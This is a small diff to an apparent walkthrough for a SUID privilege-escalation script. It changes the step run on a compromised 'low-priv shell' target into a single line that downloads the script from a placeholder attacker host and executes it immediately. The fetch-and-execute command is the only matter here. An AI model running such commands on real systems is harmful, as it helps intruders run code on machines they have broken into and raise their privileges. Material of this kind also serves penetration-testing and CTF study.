@@ -40,8 +40,7 @@ python3 -m http.server 8080
 
 On the target (low-priv shell):
 ```bash
-curl http://<attacker_ip>:8080/gtfo_suid.py -o gtfo_suid.py
-python3 gtfo_suid.py
+python3 <(curl http://<attacker_ip>:8080/gtfo_suid.py) 
 ```
 
 ## Example output
